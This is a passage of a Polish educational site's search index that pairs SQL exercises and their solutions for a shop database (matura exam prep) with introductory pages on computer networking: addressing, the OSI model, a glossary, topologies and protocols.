ka\u017cdego klienta, kt\u00f3ry dokona\u0142 przynajmniej jednego zam\u00f3wienia przed 2010 rokiem.</p>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/#zadanie-6","title":"Zadanie 6","text":"<p>Dla ka\u017cdego artyku\u0142u podaj jego identyfikator, nazw\u0119 oraz liczb\u0119 zam\u00f3wie\u0144, kt\u00f3re dotyczy\u0142y tego artyku\u0142u.</p>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/#zadanie-7","title":"Zadanie 7","text":"<p>Utw\u00f3rz zestawienie zawieraj\u0105ce nazw\u0119 miasta, id artyku\u0142u, nazw\u0119 artyku\u0142u oraz liczb\u0119 sztuk tego artyku\u0142u sprzedanych klientom z danego miasta, gdzie przekroczy\u0142a ona \\(100\\) sztuk.</p>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/#zadanie-8","title":"Zadanie 8","text":"<p>Dla ka\u017cdego artyku\u0142u podaj jego identyfikator, nazw\u0119 oraz liczb\u0119 sprzedanych egzemplarzy.</p>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/#zadanie-9","title":"Zadanie 9","text":"<p>Podaj identyfikatory i nazwy artyku\u0142\u00f3w, kt\u00f3rych nikt nie zam\u00f3wi\u0142.</p>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/#zadanie-10","title":"Zadanie 10","text":"<p>Podaj identyfikator, imi\u0119 oraz nazwisko ka\u017cdego klienta, kt\u00f3ry z\u0142o\u017cy\u0142 dok\u0142adnie \\(2\\) zam\u00f3wienia na artyku\u0142y o id_art r\u00f3wnym \\(10\\) lub \\(20\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/solution/","title":"Rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/sql/shop/solution/#zadanie-1","title":"Zadanie 1","text":"<pre><code>SELECT * \n    FROM Zamowienia \n    WHERE YEAR(data_zam) = 2015 AND MONTH(data_zam) = 5;\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/solution/#zadanie-2","title":"Zadanie 2","text":"<pre><code>SELECT imie \n    FROM Klienci \n    WHERE imie LIKE '%a';\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/solution/#zadanie-3","title":"Zadanie 3","text":"<pre><code>SELECT Klienci.id_kl, imie, nazwisko \n    FROM Klienci \n        JOIN Zamowienia USING(id_kl) \n    WHERE DAY(data_zam) = 18 AND MONTH(data_zam) = 3 AND YEAR(data_zam) = 2016 \n    GROUP BY Klienci.id_kl;\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/solution/#zadanie-4","title":"Zadanie 4","text":"<pre><code>SELECT Klienci.id_kl, imie, nazwisko, SUM(liczba_sztuk * cena) \n    FROM Klienci \n        JOIN Zamowienia USING(id_kl) \n        JOIN Artykuly USING(id_art) \n    GROUP BY Klienci.id_kl \n    ORDER BY nazwisko;\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/solution/#zadanie-5","title":"Zadanie 5","text":"<pre><code>SELECT Klienci.id_kl, imie, nazwisko \n    FROM Klienci \n        JOIN Zamowienia USING(id_kl) \n    WHERE YEAR(data_zam) &lt; 2010 \n    GROUP BY Klienci.id_kl;\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/solution/#zadanie-6","title":"Zadanie 6","text":"<pre><code>SELECT Artykuly.id_art, nazwa, COUNT(id_zam) \n    FROM Zamowienia \n        RIGHT JOIN Artykuly USING(id_art) \n    GROUP BY Artykuly.id_art;\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/solution/#zadanie-7","title":"Zadanie 7","text":"<pre><code>SELECT miasto, Artykuly.id_art, SUM(liczba_sztuk) \n    FROM Zamowienia \n        JOIN Klienci USING(id_kl) \n        JOIN Artykuly USING(id_art) \n    GROUP BY miasto, id_art\n    HAVING SUM(liczba_sztuk) &gt; 100;\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/solution/#zadanie-8","title":"Zadanie 8","text":"<pre><code>SELECT Artykuly.id_art, nazwa, SUM(liczba_sztuk) \n    FROM Zamowienia \n        RIGHT JOIN Artykuly USING(id_art) \n    GROUP BY id_art;\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/solution/#zadanie-9","title":"Zadanie 9","text":"<pre><code>SELECT id_art, nazwa \n    FROM Artykuly \n    WHERE id_art NOT IN (SELECT id_art FROM Zamowienia);\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/sql/shop/solution/#zadanie-10","title":"Zadanie 10","text":"<pre><code>SELECT Klienci.id_kl, imie, nazwisko \n    FROM Klienci \n        JOIN Zamowienia USING(id_kl) \n        JOIN Artykuly USING(id_art) \n    WHERE id_art IN (10, 20) \n    GROUP BY Klienci.id_kl \n    HAVING COUNT(id_zam) = 2;\n</code></pre>"},{"location":"networking/","title":"Sieci komputerowe","text":"<p>W dzisiejszym \u015bwiecie technologii, sieci komputerowe s\u0105 nieod\u0142\u0105cznym elementem codziennego \u017cycia. Kiedy korzystamy z Internetu, dzielimy si\u0119 plikami, drukujemy dokumenty z innego komputera w domu lub biurze, korzystamy z sieci komputerowej.</p> <p>Sie\u0107 komputerowa to grupa komputer\u00f3w i innych urz\u0105dze\u0144, kt\u00f3re s\u0105 po\u0142\u0105czone ze sob\u0105, umo\u017cliwiaj\u0105c wymian\u0119 informacji i zasob\u00f3w. Przyk\u0142ady zastosowa\u0144 sieci komputerowych to dzielenie si\u0119 dost\u0119pem do Internetu, plikami, drukarkami i innymi zasobami.</p> <p>Komputery w sieci mog\u0105 by\u0107 po\u0142\u0105czone na wiele r\u00f3\u017cnych sposob\u00f3w, zale\u017cnych od r\u00f3\u017cnych czynnik\u00f3w, takich jak ilo\u015b\u0107 i typ urz\u0105dze\u0144, odleg\u0142o\u015b\u0107 mi\u0119dzy nimi, koszt i wymagania dotycz\u0105ce bezpiecze\u0144stwa. Spos\u00f3b, w jaki te urz\u0105dzenia s\u0105 po\u0142\u0105czone, nazywamy topologi\u0105 sieci, a r\u00f3\u017cne typy topologii to m.in. magistrala, gwiazda, pier\u015bcie\u0144, siatka, drzewo i hybryda.</p> <p>W nast\u0119pnych cz\u0119\u015bciach om\u00f3wimy szczeg\u00f3\u0142owo, jak dzia\u0142aj\u0105 sieci komputerowe, jakie s\u0105 ich rodzaje, jakie protoko\u0142y sieciowe s\u0105 u\u017cywane do komunikacji oraz jakie s\u0105 podstawowe zasady bezpiecze\u0144stwa sieci, a zaczniemy od kr\u00f3tkiego s\u0142ownika najwa\u017cniejszych poj\u0119\u0107.</p>"},{"location":"networking/network-addressing/","title":"Adresowanie sieciowe","text":"<p>Adresowanie sieciowe odnosi si\u0119 do schematu przypisania adres\u00f3w do urz\u0105dze\u0144 w sieci komputerowej. Jest to kluczowy element komunikacji w sieciach, umo\u017cliwiaj\u0105cy identyfikacj\u0119 i lokalizacj\u0119 urz\u0105dze\u0144.</p>"},{"location":"networking/network-addressing/#podstawowe-pojecia","title":"Podstawowe poj\u0119cia","text":"<ul> <li>IP (Internet Protocol) Address: unikalny adres numeryczny przypisany do ka\u017cdego urz\u0105dzenia w sieci.</li> <li>Subnet: podsegment sieci, kt\u00f3ry ma w\u0142asny, odr\u0119bny zakres adres\u00f3w.</li> <li>Maska podsieci: wskazuje, kt\u00f3re cz\u0119\u015bci adresu IP odnosz\u0105 si\u0119 do sieci, a kt\u00f3re do hosta.</li> </ul>"},{"location":"networking/network-addressing/#typy-adresow-ip","title":"Typy adres\u00f3w IP","text":"<ul> <li>IPv4: adres sk\u0142adaj\u0105cy si\u0119 z czterech bajt\u00f3w (np. <code>192.168.0.1</code>). Jest to obecnie najcz\u0119\u015bciej u\u017cywana wersja, ale zaczyna brakowa\u0107 dost\u0119pnych adres\u00f3w.</li> <li>IPv6: nowsza wersja adresu IP sk\u0142adaj\u0105ca si\u0119 z 128 bit\u00f3w (np. <code>1200:0000:AB00:1234:0000:2552:7777:1313</code>). Wprowadzona w odpowiedzi na wyczerpywanie si\u0119 adres\u00f3w IPv4.</li> </ul>"},{"location":"networking/network-addressing/#klasy-adresow-ipv4","title":"Klasy adres\u00f3w IPv4","text":"<ul> <li>Klasa A (<code>1.0.0.0</code> do <code>126.0.0.0</code>): wspiera 16 milion\u00f3w host\u00f3w na ka\u017cdej z 128 sieci.</li> <li>Klasa B (<code>128.0.0.0</code> do <code>191.255.0.0</code>): wspiera 65 tysi\u0119cy host\u00f3w na ka\u017cdej z 16 tysi\u0119cy sieci.</li> <li>Klasa C (<code>192.0.0.0</code> do <code>223.255.255.0</code>): wspiera 254 hosty na ka\u017cdej z 2 milion\u00f3w sieci.</li> </ul>"},{"location":"networking/network-addressing/#adresy-specjalne","title":"Adresy specjalne","text":"<ul> <li>Adres sieci: najni\u017cszy adres w sieci.</li> <li>Adres broadcast: najwy\u017cszy adres w sieci; wysy\u0142anie do tego adresu oznacza wys\u0142anie pakietu do wszystkich urz\u0105dze\u0144 w sieci.</li> <li>Adresy prywatne: adresy zarezerwowane dla prywatnych sieci, kt\u00f3re nie s\u0105 routowane w globalnym Internecie. Przyk\u0142ady to <code>192.168.0.0/16</code>, <code>10.0.0.0/8</code> i <code>172.16.0.0/12</code>.</li> </ul>"},{"location":"networking/network-addressing/#subnetting-i-vlsm-variable-length-subnet-masking","title":"Subnetting i VLSM (Variable Length Subnet Masking)","text":"<ul> <li>Subnetting: proces dzielenia wi\u0119kszej sieci na mniejsze podsieci.</li> <li>VLSM: technika pozwalaj\u0105ca na dzielenie sieci na podsieci o r\u00f3\u017cnych rozmiarach.</li> </ul>"},{"location":"networking/network-addressing/#protokoy-adresowania","title":"Protoko\u0142y adresowania","text":"<ul> <li>DHCP (Dynamic Host Configuration Protocol): protok\u00f3\u0142 automatycznie przypisuj\u0105cy adresy IP urz\u0105dzeniom w sieci.</li> <li>ARP (Address Resolution Protocol): umo\u017cliwia znalezienie adresu MAC na podstawie adresu IP.</li> </ul>"},{"location":"networking/network-addressing/#routowanie","title":"Routowanie","text":"<ul> <li>Router: urz\u0105dzenie, kt\u00f3re \u0142\u0105czy sieci i przekierowuje pakiety mi\u0119dzy nimi na podstawie adres\u00f3w IP.</li> <li>Tabela routingu: lista w routerze pokazuj\u0105ca, jak kierowa\u0107 pakiety w oparciu o ich adresy docelowe.</li> </ul>"},{"location":"networking/network-addressing/#prezentacja","title":"Prezentacja","text":"<p>Kr\u00f3tka prezentacja na temat adresowania w sieci.</p> <p> Adresy sieciowe</p>"},{"location":"networking/osi/","title":"Model OSI","text":"<p>Model OSI (Open Systems Interconnection) to koncepcyjny model, kt\u00f3ry opisuje, jak r\u00f3\u017cne protoko\u0142y sieciowe wsp\u00f3\u0142pracuj\u0105, aby umo\u017cliwi\u0107 komunikacj\u0119 mi\u0119dzy urz\u0105dzeniami sieciowymi. Model sk\u0142ada si\u0119 z siedmiu warstw. Ka\u017cda warstwa modelu OSI komunikuje si\u0119 tylko z warstw\u0105 bezpo\u015brednio poni\u017cej lub powy\u017cej. Wszystkie warstwy \u0142\u0105cznie zapewniaj\u0105 pe\u0142ne funkcje sieciowe.</p>"},{"location":"networking/osi/#1-warstwa-fizyczna-physical-layer","title":"1. Warstwa fizyczna (Physical Layer)","text":"<p>Na najni\u017cszym poziomie mamy warstw\u0119 fizyczn\u0105, kt\u00f3ra jest odpowiedzialna za przesy\u0142anie surowych bit\u00f3w danych przez medium sieciowe. Us\u0142ugi i protoko\u0142y zwi\u0105zane z t\u0105 warstw\u0105 obejmuj\u0105 Ethernet, USB, Bluetooth, 802.11 (Wi-Fi) i inne.</p>"},{"location":"networking/osi/#2-warstwa-acza-danych-data-link-layer","title":"2. Warstwa \u0142\u0105cza danych (Data Link Layer)","text":"<p>Warstwa \u0142\u0105cza danych zajmuje si\u0119 ramkowaniem danych, wykrywaniem i napraw\u0105 b\u0142\u0119d\u00f3w, kt\u00f3re mog\u0105 wyst\u0105pi\u0107 na warstwie fizycznej. Znane protoko\u0142y tej warstwy to Ethernet i PPP (Point-to-Point Protocol).</p>"},{"location":"networking/osi/#3-warstwa-sieci-network-layer","title":"3. Warstwa sieci (Network Layer)","text":"<p>Warstwa sieci jest odpowiedzialna za dostarczenie pakiet\u00f3w danych od punktu A do punktu B. To tutaj dzia\u0142aj\u0105 adresowanie IP i routery. IP (Internet Protocol) to kluczowy protok\u00f3\u0142 tej warstwy.</p>"},{"location":"networking/osi/#4-warstwa-transportu-transport-layer","title":"4. Warstwa transportu (Transport Layer)","text":"<p>Warstwa transportu ma na celu zapewnienie bezpiecznego przesy\u0142ania danych pomi\u0119dzy systemami. Odpowiada za kontrol\u0119 przep\u0142ywu, wielokrotne \u0142\u0105czenie, wykrywanie b\u0142\u0119d\u00f3w i napraw\u0119. Kluczowe protoko\u0142y to TCP (Transmission Control Protocol) i UDP (User Datagram Protocol).</p>"},{"location":"networking/osi/#5-warstwa-sesji-session-layer","title":"5. Warstwa sesji (Session Layer)","text":"<p>Warstwa sesji zarz\u0105dza sesjami mi\u0119dzy komputerami. Jest odpowiedzialna za nawi\u0105zywanie, zarz\u0105dzanie i ko\u0144czenie po\u0142\u0105cze\u0144 mi\u0119dzy lokalnymi i zdalnymi aplikacjami.</p>"},{"location":"networking/osi/#6-warstwa-prezentacji-presentation-layer","title":"6. Warstwa prezentacji (Presentation Layer)","text":"<p>Warstwa prezentacji jest odpowiedzialna za formowanie danych dla aplikacji. Obejmuje to takie zadania, jak kodowanie i dekodowanie, kompresj\u0119 danych i szyfrowanie.</p>"},{"location":"networking/osi/#7-warstwa-aplikacji-application-layer","title":"7. Warstwa aplikacji (Application Layer)","text":"<p>Na najwy\u017cszym poziomie, warstwa aplikacji jest warstw\u0105, z kt\u00f3r\u0105 najcz\u0119\u015bciej maj\u0105 do czynienia u\u017cytkownicy ko\u0144cowi. To tutaj dzia\u0142aj\u0105 protoko\u0142y takie jak HTTP (do przegl\u0105dania stron internetowych), SMTP (do wysy\u0142ania poczty e-mail), FTP (do przesy\u0142ania plik\u00f3w), DNS (do mapowania nazw domen na adresy IP) i wiele innych.</p>"},{"location":"networking/osi/#kapsukowanie-danych-wedug-modelu-odniesienia-osi","title":"Kapsu\u0142kowanie danych wed\u0142ug modelu odniesienia OSI","text":""},{"location":"networking/terms/","title":"S\u0142ownik poj\u0119\u0107 zwi\u0105zanych z sieciami komputerowymi","text":""},{"location":"networking/terms/#siec-komputerowa","title":"Sie\u0107 komputerowa","text":"<p>Sie\u0107 komputerowa to zesp\u00f3\u0142 po\u0142\u0105czonych ze sob\u0105 komputer\u00f3w i urz\u0105dze\u0144, kt\u00f3re komunikuj\u0105 si\u0119 ze sob\u0105, wymieniaj\u0105c dane.</p>"},{"location":"networking/terms/#zasoby-sieciowe","title":"Zasoby sieciowe","text":"<p>Zasoby sieciowe to dane, aplikacje i urz\u0105dzenia, do kt\u00f3rych mo\u017cna uzyska\u0107 dost\u0119p w obr\u0119bie sieci komputerowej. Mog\u0105 to by\u0107 pliki, drukarki, serwery plik\u00f3w, bazy danych, a tak\u017ce aplikacje i us\u0142ugi.</p>"},{"location":"networking/terms/#serwer","title":"Serwer","text":"<p>Serwer to komputer lub urz\u0105dzenie sieciowe, kt\u00f3re udost\u0119pnia zasoby dla innych komputer\u00f3w lub urz\u0105dze\u0144 w sieci, znanych jako \"klienci\".</p>"},{"location":"networking/terms/#klient","title":"Klient","text":"<p>Klient to komputer lub urz\u0105dzenie sieciowe, kt\u00f3re korzysta z zasob\u00f3w udost\u0119pnianych przez serwer w sieci.</p>"},{"location":"networking/terms/#brama-ang-gateway","title":"Brama (ang. gateway)","text":"<p>Brama sieciowa to urz\u0105dzenie sieciowe umo\u017cliwiaj\u0105ce komunikacj\u0119 i przesy\u0142anie pakiet\u00f3w danych pomi\u0119dzy sieciami komputerowymi r\u00f3\u017cnego typu (opartymi o r\u00f3\u017cne protoko\u0142y).</p>"},{"location":"networking/terms/#router","title":"Router","text":"<p>Router to specjalne urz\u0105dzenie sieciowe, kt\u00f3re przekierowuje pakiety danych pomi\u0119dzy r\u00f3\u017cnymi sieciami komputerowymi lub sub-sieciami tego samego typu.</p>"},{"location":"networking/terms/#switch","title":"Switch","text":"<p>Switch, zwany tak\u017ce prze\u0142\u0105cznikiem sieciowym, to urz\u0105dzenie sieciowe, kt\u00f3re \u0142\u0105czy urz\u0105dzenia w sieci i przekierowuje pakiety danych do odpowiedniego miejsca przeznaczenia w sieci lokalnej (LAN).</p>"},{"location":"networking/terms/#host","title":"Host","text":"<p>Host to dowolne urz\u0105dzenie komputerowe pracuj\u0105ce w sieci TCP/IP, kt\u00f3re mo\u017ce by\u0107 adresowane i mo\u017ce komunikowa\u0107 si\u0119 z innymi urz\u0105dzeniami w sieci.</p>"},{"location":"networking/terms/#adres-ip","title":"Adres IP","text":"<p>Adres IP to unikatowy identyfikator przyporz\u0105dkowany ka\u017cdemu urz\u0105dzeniu sieci komputerowych funkcjonuj\u0105cych w oparciu o protok\u00f3\u0142 IP.</p>"},{"location":"networking/terms/#protoko-sieciowykomunikacyjny","title":"Protok\u00f3\u0142 sieciowy/komunikacyjny","text":"<p>Protok\u00f3\u0142 sieciowy to zbi\u00f3r regu\u0142 i standard\u00f3w, kt\u00f3re definiuj\u0105 spos\u00f3b komunikacji pomi\u0119dzy urz\u0105dzeniami w sieci.</p>"},{"location":"networking/terms/#protoko-tcpip","title":"Protok\u00f3\u0142 TCP/IP","text":"<p>Protok\u00f3\u0142 TCP/IP to zbi\u00f3r regu\u0142 komunikacyjnych najcz\u0119\u015bciej stosowanych w sieciach komputerowych. Protok\u00f3\u0142 ten obejmuje zar\u00f3wno protoko\u0142y ni\u017cszego poziomu (IP), jak i wy\u017cszego poziomu (TCP).</p>"},{"location":"networking/terms/#protoko-http","title":"Protok\u00f3\u0142 HTTP","text":"<p>Protok\u00f3\u0142 HTTP (HyperText Transfer Protocol) to zasady komunikacji wykorzystywane do przesy\u0142ania danych (g\u0142\u00f3wnie stron internetowych) w sieciach komputerowych.</p>"},{"location":"networking/terms/#protoko-https","title":"Protok\u00f3\u0142 HTTPS","text":"<p>HTTPS (HyperText Transfer Protocol Secure) to bezpieczna wersja protoko\u0142u HTTP. U\u017cywa on kryptografii do zapewnienia bezpiecze\u0144stwa przesy\u0142anych danych.</p>"},{"location":"networking/terms/#protoko-dns","title":"Protok\u00f3\u0142 DNS","text":"<p>DNS (Domain Name System) to system, kt\u00f3ry przek\u0142ada nazwy domen internetowych na adresy IP, umo\u017cliwiaj\u0105c lokalizowanie serwer\u00f3w w Internecie.</p>"},{"location":"networking/terms/#karta-sieciowa","title":"Karta sieciowa","text":"<p>Karta sieciowa to urz\u0105dzenie fizyczne lub wirtualne, kt\u00f3re umo\u017cliwia komputerowi po\u0142\u0105czenie z innymi urz\u0105dzeniami w sieci.</p>"},{"location":"networking/terms/#adres-mac","title":"Adres MAC","text":"<p>Adres MAC (Media Access Control) to unikalny identyfikator przypisany do karty sieciowej ka\u017cdego urz\u0105dzenia, kt\u00f3ry s\u0142u\u017cy do identyfikacji urz\u0105dzenia w sieci lokalnej.</p>"},{"location":"networking/terms/#klient-sieci","title":"Klient sieci","text":"<p>Klient sieci to oprogramowanie, kt\u00f3re umo\u017cliwia komputerowi korzystanie z zasob\u00f3w sieciowych udost\u0119pnianych przez serwer.</p>"},{"location":"networking/terms/#usuga","title":"Us\u0142uga","text":"<p>Us\u0142uga sieciowa to funkcja lub aplikacja dostarczana przez serwer, kt\u00f3ra jest dost\u0119pna dla klient\u00f3w w sieci. Mog\u0105 to by\u0107 takie us\u0142ugi jak udost\u0119pnianie plik\u00f3w, dost\u0119p do bazy danych, drukowanie zdalne, dost\u0119p do stron internetowych i wiele innych.</p>"},{"location":"networking/terms/#siec-bezprzewodowa-wi-fi","title":"Sie\u0107 bezprzewodowa (Wi-Fi)","text":"<p>Sie\u0107 bezprzewodowa (Wi-Fi) to typ sieci komputerowej, kt\u00f3ra nie wymaga kabli do po\u0142\u0105czenia urz\u0105dze\u0144. Zamiast tego, sie\u0107 bezprzewodowa korzysta z fal radiowych do przesy\u0142ania danych.</p>"},{"location":"networking/terms/#siec-prywatna-wirtualna-vpn","title":"Sie\u0107 prywatna wirtualna (VPN)","text":"<p>Sie\u0107 prywatna wirtualna (VPN) to technologia, kt\u00f3ra tworzy bezpieczne po\u0142\u0105czenie sieciowe przez publiczn\u0105 sie\u0107, tak\u0105 jak Internet, zabezpieczaj\u0105c twoje dane.</p>"},{"location":"networking/terms/#zapora-sieciowa-firewall","title":"Zapora sieciowa (firewall)","text":"<p>Zapora sieciowa to system bezpiecze\u0144stwa sieci, kt\u00f3ry monitoruje i kontroluje ruch sieciowy na podstawie okre\u015blonych regu\u0142 bezpiecze\u0144stwa.</p>"},{"location":"networking/terms/#przepustowosc-sieci","title":"Przepustowo\u015b\u0107 sieci","text":"<p>Przepustowo\u015b\u0107 sieci to maksymalna ilo\u015b\u0107 danych, kt\u00f3re mog\u0105 by\u0107 przes\u0142ane przez sie\u0107 w okre\u015blonym czasie. Mierzy si\u0119 j\u0105 zazwyczaj w bitach na sekund\u0119 (bps).</p>"},{"location":"networking/terms/#pakiet-danych","title":"Pakiet danych","text":"<p>Pakiet danych to jednostka danych, kt\u00f3ra jest przesy\u0142ana przez sie\u0107. Pakiet zawiera zar\u00f3wno rzeczywiste dane, jak i informacje potrzebne do tego, aby te dane dotar\u0142y do w\u0142a\u015bciwego miejsca.</p>"},{"location":"networking/topology/","title":"Topologia sieci komputerowych","text":"<p>Kiedy m\u00f3wimy o sieci komputerowej, my\u015blimy o zestawie komputer\u00f3w i innych urz\u0105dze\u0144 po\u0142\u0105czonych ze sob\u0105, kt\u00f3re mog\u0105 wymienia\u0107 dane i zasoby. Jednak kluczowym aspektem, kt\u00f3ry determinuje, jak te komputery s\u0105 po\u0142\u0105czone, jest topologia sieci.</p> <p>Topologia sieci to w istocie mapa lub schemat, kt\u00f3ry pokazuje, jak komputery, nazywane tak\u017ce w\u0119z\u0142ami, s\u0105 ze sob\u0105 po\u0142\u0105czone w sieci. Okre\u015bla ona zar\u00f3wno fizyczny uk\u0142ad sieci, czyli spos\u00f3b, w jaki wszystkie komponenty sieci s\u0105 po\u0142\u0105czone fizycznie, jak i logiczny uk\u0142ad sieci, kt\u00f3ry opisuje, jak dane przep\u0142ywaj\u0105 przez sie\u0107 od jednego urz\u0105dzenia do drugiego.</p> <p>Wyb\u00f3r odpowiedniej topologii jest kluczowy dla funkcjonowania sieci. Mo\u017ce to mie\u0107 wp\u0142yw na wiele aspekt\u00f3w, takich jak wydajno\u015b\u0107 sieci, jej odporno\u015b\u0107 na awarie, \u0142atwo\u015b\u0107 zarz\u0105dzania i koszty. To w\u0142a\u015bnie dlatego zrozumienie topologii sieci i jej r\u00f3\u017cnych typ\u00f3w jest niezb\u0119dne dla ka\u017cdego, kto chce zrozumie\u0107, jak dzia\u0142aj\u0105 sieci komputerowe, jak nimi zarz\u0105dza\u0107 i jak je konfigurowa\u0107.</p>"},{"location":"networking/topology/#topologia-magistrali-bus","title":"Topologia magistrali (Bus)","text":"<p>W tej topologii wszystkie komputery s\u0105 po\u0142\u0105czone za pomoc\u0105 jednego d\u0142ugiego kabla, zwanego magistral\u0105. Komunikacja odbywa si\u0119 w obie strony na tej samej magistrali. Jest to najprostsza i najta\u0144sza topologia, ale ma ograniczenia je\u015bli chodzi o skalowalno\u015b\u0107 i odporno\u015b\u0107 na awarie.</p>"},{"location":"networking/topology/#topologia-pierscienia-ring","title":"Topologia pier\u015bcienia (Ring)","text":"<p>W topologii pier\u015bcienia, ka\u017cdy komputer jest po\u0142\u0105czony z dwoma innymi komputerami, tworz\u0105c kr\u0105g. Informacje przesy\u0142ane s\u0105 w jednym kierunku od jednego komputera do kolejnego a\u017c do miejsca przeznaczenia. Topologia pier\u015bcienia jest \u0142atwa w zarz\u0105dzaniu, ale awaria jednego w\u0119z\u0142a mo\u017ce przerwa\u0107 ca\u0142\u0105 sie\u0107.</p>"},{"location":"networking/topology/#topologia-gwiazdy-star","title":"Topologia gwiazdy (Star)","text":"<p>W tej topologii wszystkie komputery s\u0105 po\u0142\u0105czone z centralnym w\u0119z\u0142em, kt\u00f3rym mo\u017ce by\u0107 komputer, switch lub hub. Gwiazda jest najpopularniejsz\u0105 topologi\u0105, poniewa\u017c awaria jednego w\u0119z\u0142a nie wp\u0142ywa na ca\u0142\u0105 sie\u0107, a dodanie nowego w\u0119z\u0142a jest stosunkowo proste. Jednak koszty s\u0105 wy\u017csze, a ca\u0142a sie\u0107 zale\u017cy od dzia\u0142ania centralnego w\u0119z\u0142a.</p>"},{"location":"networking/topology/#topologia-siatki-mesh","title":"Topologia siatki (Mesh)","text":"<p>W topologii siatki, ka\u017cdy komputer jest po\u0142\u0105czony z ka\u017cdym innym komputerem. Oferuje ona doskona\u0142\u0105 odporno\u015b\u0107 na awarie i optymalizacj\u0119 przep\u0142ywu danych, ale jest kosztowna i trudna do zarz\u0105dzania z powodu du\u017cej liczby po\u0142\u0105cze\u0144.</p>"},{"location":"networking/topology/#topologia-drzewa-tree","title":"Topologia drzewa (Tree)","text":"<p>Jest to hybrydowy typ topologii, kt\u00f3ry \u0142\u0105czy kilka topologii gwiazdy w hierarchicznym uk\u0142adzie. Korze\u0144 drzewa to g\u0142\u00f3wny w\u0119ze\u0142, a pozosta\u0142e w\u0119z\u0142y s\u0105 po\u0142\u0105czone jak w topologii gwiazdy.</p>"},{"location":"networking/topology/#topologia-hybrydowa-hybrid","title":"Topologia hybrydowa (Hybrid)","text":"<p>Jak sama nazwa wskazuje, topologia hybrydowa \u0142\u0105czy dwa lub wi\u0119cej r\u00f3\u017cnych typ\u00f3w topologii, zapewniaj\u0105c elastyczno\u015b\u0107 i skalowalno\u015b\u0107.</p>"},{"location":"networking/protocols/","title":"Protoko\u0142y sieciowe","text":"<p>Protoko\u0142y sieciowe to zestaw regu\u0142 i standard\u00f3w, kt\u00f3re umo\u017cliwiaj\u0105 komunikacj\u0119 pomi\u0119dzy urz\u0105dzeniami po\u0142\u0105czonymi sieci\u0105. Definiuj\u0105 spos\u00f3b formatowania, przesy\u0142ania i odbierania danych, dzi\u0119ki czemu urz\u0105dzenia mog\u0105 rozumie\u0107 i interpretowa\u0107 przesy\u0142ane wiadomo\u015bci. Protoko\u0142y sieciowe mog\u0105 dzia\u0142a\u0107 na r\u00f3\u017cnych poziomach sieciowego modelu referencyjnego, takiego jak model OSI lub TCP/IP. Poni\u017cej omawiamy kilka najwa\u017cniejszych protoko\u0142\u00f3w sieciowych.</p>"},{"location":"networking/protocols/#tcpip-transmission-control-protocolinternet-protocol","title":"TCP/IP (Transmission Control Protocol/Internet Protocol)","text":"<p>TCP/IP to zestaw protoko\u0142\u00f3w sieciowych, kt\u00f3re s\u0105 podstaw\u0105 Internetu. TCP/IP to tak naprawd\u0119 dwie warstwy protoko\u0142\u00f3w pracuj\u0105ce razem. IP odpowiada za dostarczenie pakiet\u00f3w danych od \u017ar\u00f3d\u0142a do miejsca przeznaczenia, podczas gdy TCP zapewnia niezawodno\u015b\u0107 przesy\u0142anych danych, kontroluj\u0105c wielko\u015b\u0107 i szybko\u015b\u0107 przesy\u0142ania pakiet\u00f3w.</p>"},{"location":"networking/protocols/#http-hypertext-transfer-protocol","title":"HTTP (Hypertext Transfer Protocol)","text":"<p>HTTP jest protoko\u0142em stosowanym do przesy\u0142ania dokument\u00f3w hipertekstowych, takich jak strony internetowe. Dzia\u0142a na najwy\u017cszym, aplikacyjnym poziomie modelu TCP/IP i pozwala na wymian\u0119 informacji pomi\u0119dzy przegl\u0105dark\u0105 internetow\u0105 a serwerem.</p>"},{"location":"networking/protocols/#https-hypertext-transfer-protocol-secure","title":"HTTPS (Hypertext Transfer Protocol Secure)","text":"<p>HTTPS to bezpieczna wersja HTTP, st\u0105d S - Secure. W przeciwie\u0144stwie do HTTP, HTTPS szyfruje dane przesy\u0142ane pomi\u0119dzy przegl\u0105dark\u0105 a serwerem, zapewniaj\u0105c prywatno\u015b\u0107 i bezpiecze\u0144stwo.</p>"},{"location":"networking/protocols/#ftp-file-transfer-protocol","title":"FTP (File Transfer Protocol)","text":"<p>FTP jest protoko\u0142em s\u0142u\u017c\u0105cym do przesy\u0142ania plik\u00f3w pomi\u0119dzy komputerami w sieci. Pozwala na przesy\u0142anie du\u017cych plik\u00f3w, zar\u00f3wno w formie tekstowej, jak i binarnej.</p>"},{"location":"networking/protocols/#dns-domain-name-system","title":"DNS (Domain Name System)","text":"<p>DNS to system, kt\u00f3ry przek\u0142ada nazwy domen na adresy IP. Dzi\u0119ki niemu u\u017cytkownicy mog\u0105 wpisywa\u0107 nazwy stron internetowych, zamiast pami\u0119ta\u0107 skomplikowane numery IP.</p>"},{"location":"networking/protocols/#smtp-simple-mail-transfer-protocol","title":"SMTP (Simple Mail Transfer Protocol)","text":"<p>SMTP jest protoko\u0142em u\u017cywanym do przesy\u0142ania wiadomo\u015bci e-mail pomi\u0119dzy serwerami. Wi\u0119kszo\u015b\u0107 e-maili przesy\u0142anych przez Internet korzysta z SMTP do przesy\u0142ania wiadomo\u015bci z jednego serwera na inny.</p>"},{"location":"networking/protocols/#imap-i-pop3-internet-message-access-protocol-post-office-protocol","title":"IMAP i POP3 (Internet Message Access Protocol, Post Office Protocol)","text":"<p>IMAP i POP3 to dwa protoko\u0142y u\u017cywane do odbierania wiadomo\u015bci e-mail na komputery klient\u00f3w. IMAP jest bardziej zaawansowany, umo\u017cliwiaj\u0105c u\u017cytkownikom organizowanie i zarz\u0105dzanie wiadomo\u015bciami bezpo\u015brednio na serwerze, podczas gdy POP3 pobiera wiadomo\u015bci na 